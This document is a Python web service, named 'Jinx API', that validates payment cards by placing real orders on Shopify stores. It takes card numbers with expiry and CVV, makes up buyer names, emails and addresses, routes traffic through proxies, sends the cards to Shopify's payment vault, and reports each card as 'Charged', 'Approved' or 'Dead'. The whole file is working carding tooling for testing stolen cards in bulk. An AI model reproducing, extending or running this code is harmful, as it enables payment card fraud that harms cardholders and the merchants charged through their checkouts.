#!/usr/bin/env python3
"""
Jinx API — DEBUG EDITION (v4.1)
Shows REAL error messages for debugging
"""

import os
import re
import json
import time
import random
import logging
import asyncio
import threading
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor

import requests
from aiohttp import web

HOST = os.environ.get("API_HOST", "0.0.0.0")
PORT = int(os.environ.get("API_PORT", "8080"))
WORKERS = int(os.environ.get("API_WORKERS", "20"))

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

VAULT_ENDPOINTS = [
    "https://checkout.pci.shopifyinc.com/sessions",
    "https://deposit.us.shopifycs.com/sessions",
]

PRICE_MIN = 2.00
PRICE_MAX = 25.00

logging.basicConfig(format="%(asctime)s [%(levelname)s] %(message)s", level=logging.INFO)
log = logging.getLogger("api")


BOOK = {
    "US": {"address1": "123 Main St", "city": "Portland", "postalCode": "04101",
           "zoneCode": "ME", "countryCode": "US", "phone": "+12075551234",
           "state": "Maine", "currency": "USD"},
    "MX": {"address1": "Av. Reforma 222", "city": "Ciudad de Mexico", "postalCode": "06600",
           "zoneCode": "CMX", "countryCode": "MX", "phone": "+525555555555",
           "state": "Ciudad de Mexico", "currency": "MXN"},
    "DEFAULT": {"address1": "123 Main St", "city": "Portland", "postalCode": "04101",
                "zoneCode": "ME", "countryCode": "US", "phone": "+12075551234",
                "state": "Maine", "currency": "USD"},
}

_bin_cache = {}
_bin_lock = threading.Lock()


def lookup_bin_country(bin6):
    bin6 = str(bin6)[:6]
    if not bin6.isdigit():
        return "US"
    with _bin_lock:
        if bin6 in _bin_cache:
            return _bin_cache[bin6]
    try:
        r = requests.get(f"https://bins.antipublic.cc/bins/{bin6}", timeout=5)
        if r.status_code == 200:
            d = r.json()
            c = (d.get("country_code") or d.get("country_alpha2") or "US").upper()
            with _bin_lock:
                _bin_cache[bin6] = c
            return c
    except Exception:
        pass
    with _bin_lock:
        _bin_cache[bin6] = "US"
    return "US"


def addr_for(cc_number):
    cc = lookup_bin_country(cc_number[:6])
    return BOOK.get(cc, BOOK["DEFAULT"])


def parse_proxy(p):
    if not p:
        return None
    p = p.strip()
    if not p:
        return None
    if p.startswith(("socks5://", "socks5h://", "socks4://", "http://", "https://")):
        return p
    if "@" in p:
        return f"http://{p}"
    parts = p.split(":")
    if len(parts) == 4:
        ip, port, user, pw = parts
        return f"http://{user}:{pw}@{ip}:{port}"
    if len(parts) == 2:
        return f"http://{p}"
    return None


PROPOSAL_QUERY = (
    "query Proposal($delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,"
    "$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,"
    "$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,"
    "$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,"
    "$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,"
    "$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,"
    "$optionalDuties:OptionalDutiesInput,$captcha:CaptchaInput){"
    "session(sessionInput:$sessionInput){"
    "negotiate(input:{"
    "purchaseProposal:{"
    "delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,"
    "buyerIdentity:$buyerIdentity,taxes:$taxes,tip:$tip,note:$note,"
    "nonNegotiableTerms:$nonNegotiableTerms,"
    "localizationExtension:$localizationExtension,"
    "scriptFingerprint:$scriptFingerprint,"
    "optionalDuties:$optionalDuties,captcha:$captcha},"
    "checkpointData:$checkpointData,"
    "queueToken:$queueToken}){"
    "__typename "
    "result{"
    "... on NegotiationResultAvailable{"
    "checkpointData queueToken "
    "sellerProposal{"
    "__typename "
    "delivery{... on FilledDeliveryTerms{deliveryLines{id "
    "availableDeliveryStrategies{... on CompleteDeliveryStrategy{handle title __typename}__typename}"
    "__typename}__typename}__typename}"
    "payment{... on FilledPaymentTerms{availablePaymentLines{paymentMethod{"
    "... on PaymentProvider{paymentMethodIdentifier name __typename}"
    "__typename}__typename}__typename}__typename}"
    "__typename"
    "}"
    "__typename"
    "}"
    "... on CheckpointDenied{redirectUrl __typename}"
    "... on Throttled{pollAfter queueToken pollUrl __typename}"
    "... on NegotiationResultFailed{__typename}"
    "__typename"
    "}"
    "errors{code localizedMessage __typename}"
    "__typename"
    "}"
    "}"
    "}"
)

SUBMIT_QUERY = (
    "mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,"
    "$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,"
    "$analytics:AnalyticsInput){"
    "submitForCompletion(input:$input attemptToken:$attemptToken "
    "metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult "
    "analytics:$analytics){"
    "... on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}"
    "... on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}"
    "... on SubmitFailed{reason __typename}"
    "... on SubmitRejected{errors{... on NegotiationError{code localizedMessage nonLocalizedMessage __typename}__typename}__typename}"
    "... on Throttled{pollAfter pollUrl queueToken __typename}"
    "... on CheckpointDenied{redirectUrl __typename}"
    "... on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}"
    "__typename}}"
    "fragment ReceiptDetails on Receipt{"
    "... on ProcessedReceipt{id token orderIdentity{buyerIdentifier id __typename}__typename}"
    "... on ProcessingReceipt{id pollDelay __typename}"
    "... on ActionRequiredReceipt{id action{... on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}"
    "... on FailedReceipt{id processingError{... on PaymentFailed{code messageUntranslated __typename}__typename}__typename}"
    "__typename}"
)

POLL_QUERY = (
    "query PollForReceipt($receiptId:ID!,$sessionToken:String!){"
    "receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){"
    "...ReceiptDetails __typename}}"
    "fragment ReceiptDetails on Receipt{"
    "... on ProcessedReceipt{id token orderIdentity{buyerIdentifier id __typename}__typename}"
    "... on ProcessingReceipt{id pollDelay __typename}"
    "... on ActionRequiredReceipt{id action{... on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}"
    "... on FailedReceipt{id processingError{... on PaymentFailed{code messageUntranslated __typename}__typename}__typename}"
    "__typename}"
)


def checkout_sync(cc_raw, site_raw, proxy_raw):
    """DEBUG VERSION — returns detailed error info."""
    out = {
        "Response": "SITE_ERROR",
        "Price": "-",
        "Gateway": "Shopify",
        "Status": "Site Error",
        "Card": cc_raw,
        "Site": site_raw,
        "Debug": "",
    }

    def dbg(msg):
        out["Debug"] = msg
        log.warning(f"[DEBUG] {msg}")

    parts = cc_raw.split("|")
    if len(parts) != 4:
        dbg("Invalid card format")
        out["Response"] = "INVALID_FORMAT"
        return out

    cc, mm, yyyy, cvv = parts
    if len(yyyy) == 2:
        yyyy = "20" + yyyy

    site = re.sub(r"^https?://", "", site_raw.strip()).rstrip("/")
    proxy_url = parse_proxy(proxy_raw) if proxy_raw else None

    a = addr_for(cc)
    currency = a.get("currency", "USD")
    country = a.get("countryCode", "US")
    first_name = random.choice(["James", "John", "Robert", "Michael", "David"])
    last_name = random.choice(["Smith", "Johnson", "Williams", "Brown", "Jones"])
    email = f"{first_name.lower()}.{last_name.lower()}{random.randint(1, 9999)}@gmail.com"

    dbg(f"START site={site} proxy={proxy_raw} country={country} currency={currency}")

    s = requests.Session()
    s.headers.update({"User-Agent": UA, "Accept-Language": "en-US,en;q=0.9"})
    if proxy_url:
        s.proxies.update({"http": proxy_url, "https": proxy_url})

    no_proxy_sess = requests.Session()
    no_proxy_sess.headers.update({"User-Agent": UA})

    try:
        # ── 1. Products ──
        try:
            r = s.get(f"https://{site}/products.json", timeout=15)
            dbg(f"products.json → HTTP {r.status_code}")
        except Exception as e:
            dbg(f"products.json exception: {type(e).__name__}: {str(e)[:60]}")
            out["Response"] = f"PRODUCTS_FAIL: {type(e).__name__}"
            return out

        if r.status_code != 200:
            dbg(f"products.json status: {r.status_code}")
            out["Response"] = f"PRODUCTS_HTTP_{r.status_code}"
            return out

        try:
            data = r.json()
        except Exception:
            dbg("products.json invalid JSON")
            out["Response"] = "PRODUCTS_JSON_INVALID"
            return out

        valid = []
        blacklist = ["sample", "free", "gift", "test", "donation", "tip"]
        for p in data.get("products", []):
            title = (p.get("title") or "").lower()
            if any(w in title for w in blacklist):
                continue
            for v in p.get("variants", []):
                if not v.get("available", True):
                    continue
                try:
                    price = float(str(v.get("price", "999")).replace(",", ""))
                except Exception:
                    continue
                if PRICE_MIN <= price <= PRICE_MAX:
                    valid.append({"id": v["id"], "price": price})

        if not valid:
            dbg(f"No valid products (checked {len(data.get('products', []))})")
            out["Response"] = "NO_VALID_PRODUCT"
            return out

        valid.sort(key=lambda x: x["price"])
        mid = min(len(valid) // 2, len(valid) - 1)
        vid = valid[mid]["id"]
        out["Price"] = f"{valid[mid]['price']:.2f}"
        dbg(f"Picked variant {vid} at ${out['Price']}")

        # ── 2. Add to cart ──
        try:
            r = s.post(f"https://{site}/cart/add.js",
                headers={"Accept": "application/json",
                         "Content-Type": "application/x-www-form-urlencoded",
                         "Referer": f"https://{site}/",
                         "Origin": f"https://{site}"},
                data={"id": str(vid), "quantity": "1", "form_type": "product"},
                timeout=15)
            dbg(f"cart/add.js → HTTP {r.status_code}")
            if r.status_code != 200:
                out["Response"] = f"CART_HTTP_{r.status_code}"
                return out
        except Exception as e:
            dbg(f"cart/add.js exception: {type(e).__name__}")
            out["Response"] = f"CART_FAIL: {type(e).__name__}"
            return out

        # ── 3. Cart token ──
        try:
            r = s.get(f"https://{site}/cart.js", timeout=15)
            cart_token = r.json().get("token")
            dbg(f"cart.js token: {cart_token[:20] if cart_token else 'NONE'}...")
        except Exception as e:
            dbg(f"cart.js exception: {type(e).__name__}")
            out["Response"] = "CART_TOKEN_FAIL"
            return out

        # ── 4. Init checkout ──
        try:
            r = s.post(f"https://{site}/cart",
                headers={"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                         "Content-Type": "application/x-www-form-urlencoded",
                         "Origin": f"https://{site}",
                         "Referer": f"https://{site}/cart",
                         "Upgrade-Insecure-Requests": "1"},
                data={"checkout": "", "updates[]": "1"},
                allow_redirects=False, timeout=15)

            dbg(f"checkout POST → HTTP {r.status_code}")

            if r.status_code not in (301, 302, 303, 307, 308):
                out["Response"] = f"CHECKOUT_HTTP_{r.status_code}"
                return out

            loc1 = r.headers.get("location", "")
            dbg(f"Redirect 1: {loc1[:80]}")
            r2 = s.get(loc1, allow_redirects=False, timeout=15)
            final_url = r2.headers.get("location", "") if r2.status_code in (301, 302, 303, 307, 308) else loc1
            dbg(f"Final URL: {final_url[:100]}")
            r3 = s.get(final_url, timeout=25)
            html = r3.text
            dbg(f"Checkout page: {len(html)} bytes")
        except Exception as e:
            dbg(f"checkout exception: {type(e).__name__}: {str(e)[:60]}")
            out["Response"] = f"CHECKOUT_FAIL: {type(e).__name__}"
            return out

        if len(html) < 500:
            dbg("Checkout page too small")
            out["Response"] = "CHECKOUT_EMPTY"
            return out

        if "captcha" in html.lower():
            dbg("Captcha detected")
            out["Response"] = "CAPTCHA_REQUIRED"
            return out

        # Session token
        session_token = None
        for pat in [r'"serializedSessionToken"\s*:\s*"([^"]+)"',
                    r'"sessionToken"\s*:\s*"([^"]+)"',
                    r'serialized-sessionToken[^>]*content="&quot;([^&]+)&quot;"']:
            m = re.search(pat, html)
            if m:
                session_token = m.group(1)
                break

        if not session_token:
            dbg("No session token in HTML")
            out["Response"] = "NO_SESSION_TOKEN"
            return out

        dbg(f"Session token: {session_token[:20]}...")

        queue_token = ""
        for pat in [r'"queueToken"\s*:\s*"([^"]+)"', r'queueToken&quot;:&quot;([^&]+)&quot;']:
            m = re.search(pat, html)
            if m:
                queue_token = m.group(1)
                break

        stable_id = ""
        for pat in [r'"stableId"\s*:\s*"([^"]+)"', r'stableId&quot;:&quot;([^&]+)&quot;']:
            m = re.search(pat, html)
            if m:
                stable_id = m.group(1)
                break

        attempt_token = ""
        m = re.search(r"/checkouts/cn/([a-zA-Z0-9]+)", final_url)
        if m:
            attempt_token = m.group(1)

        dbg(f"queue={bool(queue_token)} stable={bool(stable_id)} attempt={bool(attempt_token)}")

        # ── 4.5 Proposal ──
        gql_url = f"https://{site}/checkouts/unstable/graphql"
        gql_headers = {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Origin": f"https://{site}",
            "Referer": f"https://{site}/",
            "X-Checkout-One-Session-Token": session_token,
            "X-Checkout-Web-Deploy-Stage": "production",
            "X-Checkout-Web-Server-Handling": "fast",
            "X-Checkout-Web-Source-Id": attempt_token,
        }

        addr_obj = {
            "address1": a["address1"], "city": a["city"],
            "countryCode": country, "postalCode": a["postalCode"],
            "firstName": first_name, "lastName": last_name,
            "zoneCode": a["zoneCode"], "phone": a["phone"],
        }

        state = {"queue": queue_token, "checkpoint": None, "delivery": ""}

        def proposal_payload(handle=None):
            dv = {
                "deliveryLines": [{
                    "destination": {"streetAddress": addr_obj},
                    "targetMerchandiseLines": (
                        {"lines": [{"stableId": stable_id or "1"}]} if handle else {"any": True}),
                    "deliveryMethodTypes": ["SHIPPING"],
                    "expectedTotalPrice": {"any": True},
                    "destinationChanged": (handle is None),
                }],
                "noDeliveryRequired": [], "useProgressiveRates": False,
                "prefetchShippingRatesStrategy": None,
            }
            if handle:
                dv["deliveryLines"][0]["selectedDeliveryStrategy"] = {
                    "deliveryStrategyByHandle": {"handle": handle, "customDeliveryRate": False},
                    "options": {}}
            else:
                dv["deliveryLines"][0]["selectedDeliveryStrategy"] = {
                    "deliveryStrategyMatchingConditions": {
                        "estimatedTimeInTransit": {"any": True},
                        "shipments": {"any": True}},
                    "options": {}}

            return {
                "query": PROPOSAL_QUERY,
                "variables": {
                    "sessionInput": {"sessionToken": session_token},
                    "queueToken": state["queue"] or "",
                    "checkpointData": state["checkpoint"],
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": dv,
                    "merchandise": {"merchandiseLines": [{
                        "stableId": stable_id or "1",
                        "merchandise": {"productVariantReference": {
                            "id": f"gid://shopify/ProductVariantMerchandise/{vid}",
                            "variantId": f"gid://shopify/ProductVariant/{vid}",
                            "properties": [], "sellingPlanId": None, "sellingPlanDigest": None}},
                        "quantity": {"items": {"value": 1}},
                        "expectedTotalPrice": {"any": True},
                        "lineComponentsSource": None, "lineComponents": []}]},
                    "payment": {"totalAmount": {"any": True}, "paymentLines": [],
                                "billingAddress": {"streetAddress": addr_obj}},
                    "buyerIdentity": {
                        "customer": {"presentmentCurrency": currency, "countryCode": country},
                        "email": email, "emailChanged": False,
                        "phoneCountryCode": country,
                        "marketingConsent": [{"email": {"value": email}}],
                        "shopPayOptInPhone": {"countryCode": country}, "rememberMe": False},
                    "tip": {"tipLines": []},
                    "taxes": {"proposedAllocations": None,
                        "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": currency}},
                        "proposedTotalIncludedAmount": None,
                        "proposedMixedStateTotalAmount": None, "proposedExemptions": []},
                    "note": {"message": None, "customAttributes": []},
                    "localizationExtension": {"fields": []},
                    "nonNegotiableTerms": None,
                    "scriptFingerprint": {"signature": None, "signatureUuid": None,
                        "lineItemScriptChanges": [], "paymentScriptChanges": [],
                        "shippingScriptChanges": []},
                    "optionalDuties": {"buyerRefusesDuties": False},
                },
                "operationName": "Proposal",
            }

        # First proposal
        proposal_error = None
        for attempt in range(6):
            try:
                r = s.post(gql_url, headers=gql_headers, json=proposal_payload(), timeout=20)
                dbg(f"Proposal #{attempt+1} → HTTP {r.status_code}")
                j = r.json()
            except Exception as e:
                dbg(f"Proposal #{attempt+1} exception: {type(e).__name__}")
                time.sleep(1)
                continue

            if j.get("errors"):
                proposal_error = str(j["errors"])[:200]
                dbg(f"Proposal GraphQL errors: {proposal_error}")
                break

            negotiate = j.get("data", {}).get("session", {}).get("negotiate", {})
            result_r = negotiate.get("result", {}) or {}
            tn = result_r.get("__typename", "")
            dbg(f"Proposal #{attempt+1} result type: {tn}")

            if tn != "NegotiationResultAvailable":
                time.sleep(1)
                continue

            state["queue"] = result_r.get("queueToken") or state["queue"]
            state["checkpoint"] = result_r.get("checkpointData") or state["checkpoint"]
            seller = result_r.get("sellerProposal", {}) or {}
            delivery = seller.get("delivery", {}) or {}
            dbg(f"Delivery type: {delivery.get('__typename')}")

            if delivery.get("__typename") == "FilledDeliveryTerms":
                dl = delivery.get("deliveryLines", []) or []
                if dl:
                    strats = dl[0].get("availableDeliveryStrategies", []) or []
                    if strats:
                        state["delivery"] = strats[0].get("handle", "")
                        dbg(f"Delivery handle: {state['delivery']}")
                        break
            time.sleep(1)

        if not state["delivery"]:
            out["Response"] = "NO_DELIVERY_STRATEGY"
            if proposal_error:
                out["Response"] = f"PROPOSAL_ERR"
            return out

        # Second proposal
        try:
            r = s.post(gql_url, headers=gql_headers, json=proposal_payload(state["delivery"]), timeout=20)
            j = r.json()
            dbg(f"Proposal #2 → HTTP {r.status_code}")
        except Exception as e:
            dbg(f"Proposal #2 exception: {type(e).__name__}")
            out["Response"] = "PROPOSAL_2_FAIL"
            return out

        negotiate = j.get("data", {}).get("session", {}).get("negotiate", {})
        result_r = negotiate.get("result", {}) or {}
        payment_method_id = ""
        if result_r.get("__typename") == "NegotiationResultAvailable":
            state["checkpoint"] = result_r.get("checkpointData") or state["checkpoint"]
            state["queue"] = result_r.get("queueToken") or state["queue"]
            seller = result_r.get("sellerProposal", {}) or {}
            pl = (seller.get("payment", {}) or {}).get("availablePaymentLines", []) or []
            if pl:
                payment_method_id = pl[0].get("paymentMethod", {}).get("paymentMethodIdentifier", "")

        if not payment_method_id:
            dbg("No payment method identifier")
            out["Response"] = "NO_PAYMENT_METHOD"
            return out

        dbg(f"Payment method: {payment_method_id[:30]}...")

        # ── 5. Vault ──
        vault_payload = {
            "credit_card": {"number": cc, "month": int(mm), "year": int(yyyy),
                            "verification_value": cvv,
                            "name": f"{first_name} {last_name}"},
            "payment_session_scope": site,
        }
        payment_session_id = None
        for url in VAULT_ENDPOINTS:
            try:
                r = no_proxy_sess.post(url, json=vault_payload,
                    headers={"Content-Type": "application/json",
                             "Accept": "application/json",
                             "Origin": "https://checkout.shopifycs.com",
                             "Referer": "https://checkout.shopifycs.com/",
                             "User-Agent": UA}, timeout=15)
                dbg(f"Vault {urlparse(url).netloc} → HTTP {r.status_code}")
                if r.status_code == 200:
                    pid = r.json().get("id")
                    if pid:
                        payment_session_id = pid
                        break
            except Exception as e:
                dbg(f"Vault exception: {type(e).__name__}")
                pass

        if not payment_session_id:
            dbg("Vault failed")
            out["Response"] = "VAULT_FAILED"
            return out

        dbg(f"Payment session: {payment_session_id[:20]}...")

        # ── 6. Submit ──
        submit_payload = {
            "query": SUBMIT_QUERY,
            "variables": {
                "input": {
                    "checkpointData": state["checkpoint"],
                    "sessionInput": {"sessionToken": session_token},
                    "queueToken": state["queue"] or "",
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {"deliveryLines": [{
                        "selectedDeliveryStrategy": {
                            "deliveryStrategyByHandle": {"handle": state["delivery"], "customDeliveryRate": False},
                            "options": {}},
                        "targetMerchandiseLines": {"lines": [{"stableId": stable_id or "1"}]},
                        "destination": {"streetAddress": addr_obj},
                        "deliveryMethodTypes": ["SHIPPING"],
                        "expectedTotalPrice": {"any": True},
                        "destinationChanged": False}],
                        "noDeliveryRequired": [], "useProgressiveRates": False},
                    "merchandise": {"merchandiseLines": [{
                        "stableId": stable_id or "1",
                        "merchandise": {"productVariantReference": {
                            "id": f"gid://shopify/ProductVariantMerchandise/{vid}",
                            "variantId": f"gid://shopify/ProductVariant/{vid}",
                            "properties": [], "sellingPlanId": None, "sellingPlanDigest": None}},
                        "quantity": {"items": {"value": 1}},
                        "expectedTotalPrice": {"any": True},
                        "lineComponentsSource": None, "lineComponents": []}]},
                    "payment": {"totalAmount": {"any": True},
                        "paymentLines": [{"paymentMethod": {"directPaymentMethod": {
                            "paymentMethodIdentifier": payment_method_id,
                            "sessionId": payment_session_id,
                            "billingAddress": {"streetAddress": addr_obj},
                            "cardSource": None}},
                            "amount": {"any": True}, "dueAt": None}],
                        "billingAddress": {"streetAddress": addr_obj}},
                    "buyerIdentity": {
                        "buyerIdentity": {"presentmentCurrency": currency, "countryCode": country},
                        "contactInfoV2": {"emailOrSms": {"value": email, "emailOrSmsChanged": False}},
                        "marketingConsent": [{"email": {"value": email}}],
                        "shopPayOptInPhone": {"countryCode": country}},
                    "tip": {"tipLines": []},
                    "taxes": {"proposedAllocations": None,
                        "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": currency}},
                        "proposedTotalIncludedAmount": None,
                        "proposedMixedStateTotalAmount": None, "proposedExemptions": []},
                    "note": {"message": None, "customAttributes": []},
                    "localizationExtension": {"fields": []},
                    "nonNegotiableTerms": None,
                    "scriptFingerprint": {"signature": None, "signatureUuid": None,
                        "lineItemScriptChanges": [], "paymentScriptChanges": [],
                        "shippingScriptChanges": []},
                    "optionalDuties": {"buyerRefusesDuties": False},
                },
                "attemptToken": f"{attempt_token}-{random.random()}",
                "metafields": [],
                "analytics": {"requestUrl": final_url},
            },
            "operationName": "SubmitForCompletion",
        }

        try:
            r = s.post(gql_url, headers=gql_headers, json=submit_payload, timeout=25)
            j = r.json()
            dbg(f"Submit → HTTP {r.status_code}")
        except Exception as e:
            dbg(f"Submit exception: {type(e).__name__}")
            out["Response"] = "SUBMIT_FAIL"
            return out

        c = j.get("data", {}).get("submitForCompletion", {})
        tn = c.get("__typename", "")
        dbg(f"Submit type: {tn}")

        if tn not in ("SubmitSuccess", "SubmittedForCompletion", "SubmitAlreadyAccepted"):
            errs = c.get("errors", [])
            if errs:
                code = errs[0].get("code", "")
                msg = errs[0].get("localizedMessage", "") or errs[0].get("nonLocalizedMessage", "")
                dbg(f"Submit errors: code={code} msg={msg[:100]}")
                out["Response"] = code if code else "CARD_DECLINED"
                out["Status"] = "Dead"
            else:
                out["Response"] = "SUBMIT_REJECTED"
                out["Status"] = "Dead"
            return out

        rid = (c.get("receipt", {}) or {}).get("id", "")
        if not rid:
            dbg("No receipt ID")
            out["Response"] = "NO_RECEIPT"
            return out

        dbg(f"Receipt ID: {rid[:20]}...")

        # ── 7. Poll ──
        for _ in range(8):
            time.sleep(2)
            try:
                r = s.post(gql_url, headers=gql_headers,
                    json={"query": POLL_QUERY,
                          "variables": {"receiptId": rid, "sessionToken": session_token},
                          "operationName": "PollForReceipt"}, timeout=25)
                j = r.json()
            except Exception:
                continue

            receipt = j.get("data", {}).get("receipt", {}) or {}
            rtn = receipt.get("__typename", "")
            dbg(f"Poll type: {rtn}")

            if rtn == "ProcessedReceipt" or "orderIdentity" in receipt:
                out["Response"] = "ORDER_PLACED"
                out["Status"] = "Charged"
                out["Gateway"] = "Shopify Payments"
                dbg("CHARGED!")
                return out

            if rtn == "ActionRequiredReceipt":
                out["Response"] = "3DS_REQUIRED"
                out["Status"] = "Approved"
                out["Gateway"] = "Shopify Payments"
                return out

            if rtn == "FailedReceipt":
                pe = receipt.get("processingError", {}) or {}
                code = pe.get("code", "CARD_DECLINED")
                msg = pe.get("messageUntranslated", "")
                out["Response"] = code if code else "CARD_DECLINED"
                dbg(f"Failed: {code} {msg[:80]}")
                if code in ("INSUFFICIENT_FUNDS", "OTP_REQUIRED"):
                    out["Status"] = "Approved"
                    out["Gateway"] = "Shopify Payments"
                else:
                    out["Status"] = "Dead"
                return out

        out["Response"] = "POLL_TIMEOUT"
        return out

    except Exception as e:
        dbg(f"TOP exception: {type(e).__name__}: {str(e)[:80]}")
        out["Response"] = f"EXCEPTION_{type(e).__name__}"
        return out
    finally:
        try:
            s.close()
        except Exception:
            pass
        try:
            no_proxy_sess.close()
        except Exception:
            pass


async def handle_check(request):
    cc = request.query.get("cc", "").strip()
    site = request.query.get("site", "").strip()
    proxy = request.query.get("proxy", "").strip() or None
    debug = request.query.get("debug", "0") == "1"

    if not cc or not site:
        return web.json_response({
            "Response": "MISSING_PARAMS",
            "Price": "-",
            "Gateway": "UNKNOWN",
            "Status": "Site Error",
        })

    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(executor, checkout_sync, cc, site, proxy)

    response = {
        "Response": result.get("Response", "CARD_DECLINED"),
        "Price": result.get("Price", "-"),
        "Gateway": result.get("Gateway", "Shopify"),
        "Status": result.get("Status", "Dead"),
        "Card": result.get("Card", cc),
        "Site": result.get("Site", site),
    }

    if debug:
        response["Debug"] = result.get("Debug", "")

    return web.json_response(response)


async def handle_health(request):
    return web.json_response({"status": "ok", "service": "jinx-api"})


async def handle_root(request):
    return web.json_response({
        "service": "jinx-api",
        "version": "4.1.0-DEBUG",
        "endpoints": ["/Shopify", "/shopify", "/health"],
    })


def make_app():
    app = web.Application()
    app.router.add_get("/", handle_root)
    app.router.add_get("/health", handle_health)
    app.router.add_get("/Shopify", handle_check)
    app.router.add_get("/shopify", handle_check)
    return app


executor = ThreadPoolExecutor(max_workers=WORKERS)


if __name__ == "__main__":
    print(f"Jinx-api DEBUG v4.1 starting on http://{HOST}:{PORT}")
    print(f"Workers: {WORKERS}")
    print(f"Debug endpoint: /Shopify?...&debug=1")
    app = make_app()
    web.run_app(app, host=HOST, port=PORT, access_log=None, print=None)
